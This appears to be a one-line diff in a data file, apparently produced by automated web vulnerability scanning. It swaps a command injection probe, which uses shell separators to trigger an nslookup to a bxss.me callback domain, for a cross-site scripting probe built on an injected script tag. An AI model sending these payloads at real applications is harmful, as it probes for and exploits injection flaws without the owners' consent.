@@ -1,1 +1,1 @@
-&nslookup -q=cname hitblqhxmeszua9426.bxss.me&'\"`0&nslookup -q=cname hitblqhxmeszua9426.bxss.me&`'
+555'"()&%<zzz><ScRiPt >lb69(9378)</ScRiPt>
